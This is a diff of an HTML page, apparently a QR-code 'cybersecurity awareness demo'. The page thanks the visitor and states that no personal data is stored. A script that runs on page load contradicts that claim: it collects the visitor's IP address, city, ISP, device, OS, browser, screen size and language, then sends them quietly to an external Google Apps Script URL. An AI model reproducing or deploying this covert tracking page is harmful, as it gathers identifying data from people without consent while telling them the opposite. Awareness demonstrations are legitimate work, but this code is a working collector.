@@ -1,43 +1,95 @@
-<script>
-async function collectData() {
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>GDG Cybersecurity Demo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
 
-  const ipData = await fetch("https://ipwho.is/").then(r => r.json());
+  <style>
+    body {
+      background: #020617;
+      color: white;
+      font-family: Arial, sans-serif;
+      margin: 0;
+      height: 100vh;
 
-  const ua = navigator.userAgent;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      text-align: center;
+    }
 
-  function getOS() {
-    if (ua.includes("Android")) return "Android";
-    if (ua.includes("iPhone")) return "iPhone";
-    if (ua.includes("Windows")) return "Windows";
-    if (ua.includes("Mac")) return "MacOS";
-    return "Unknown";
-  }
+    h1 {
+      color: #38bdf8;
+      font-size: 32px;
+    }
 
-  function getBrowser() {
-    if (ua.includes("Brave")) return "Brave";
-    if (ua.includes("Chrome")) return "Chrome";
-    if (ua.includes("Safari")) return "Safari";
-    if (ua.includes("Firefox")) return "Firefox";
-    return "Unknown";
-  }
+    p {
+      font-size: 18px;
+      opacity: 0.85;
+    }
+  </style>
+</head>
 
-  const params = new URLSearchParams({
-    ip: ipData.ip,
-    city: ipData.city,
-    isp: ipData.isp,
-    device: /Mobi/.test(ua) ? "Mobile" : "Desktop",
-    browser: getBrowser(),
-    os: getOS(),
-    screen: screen.width + "x" + screen.height,
-    lang: navigator.language
-  });
+<body>
 
-  fetch(
-    "https://script.google.com/macros/s/AKfycbxfjA9iKWgXo60-3nSECQj4SV88ipZI5YMvrmKZaE3zXkK3JZBfXeaAKG6MMbTIWMRy/exec?" +
-      params.toString(),
-    { mode: "no-cors" }
-  );
-}
+  <!-- ✅ Visible page -->
+  <div>
+    <h1>✅ Thank You</h1>
+    <p>Thanks for scanning the QR code</p>
+    <p>Cybersecurity Awareness Demo</p>
+    <p><b>No personal data is stored</b></p>
+  </div>
 
-collectData();
-</script>
+  <!-- 🔒 Background data collection -->
+  <script>
+    async function collectData() {
+
+      try {
+        const ipData = await fetch("https://ipwho.is/").then(r => r.json());
+
+        const ua = navigator.userAgent;
+
+        function getOS() {
+          if (ua.includes("Android")) return "Android";
+          if (ua.includes("iPhone")) return "iPhone";
+          if (ua.includes("Windows")) return "Windows";
+          if (ua.includes("Mac")) return "MacOS";
+          return "Unknown";
+        }
+
+        function getBrowser() {
+          if (ua.includes("Brave")) return "Brave";
+          if (ua.includes("Chrome")) return "Chrome";
+          if (ua.includes("Safari")) return "Safari";
+          if (ua.includes("Firefox")) return "Firefox";
+          return "Unknown";
+        }
+
+        const params = new URLSearchParams({
+          ip: ipData.ip,
+          city: ipData.city,
+          isp: ipData.isp,
+          device: /Mobi/.test(ua) ? "Mobile" : "Desktop",
+          browser: getBrowser(),
+          os: getOS(),
+          screen: screen.width + "x" + screen.height,
+          lang: navigator.language
+        });
+
+        fetch(
+          "https://script.google.com/macros/s/AKfycbxfjA9iKWgXo60-3nSECQj4SV88ipZI5YMvrmKZaE3zXkK3JZBfXeaAKG6MMbTIWMRy/exec?"
+          + params.toString(),
+          { mode: "no-cors" }
+        );
+
+      } catch (err) {
+        console.log("Demo loaded safely");
+      }
+    }
+
+    collectData();
+  </script>
+
+</body>
+</html>
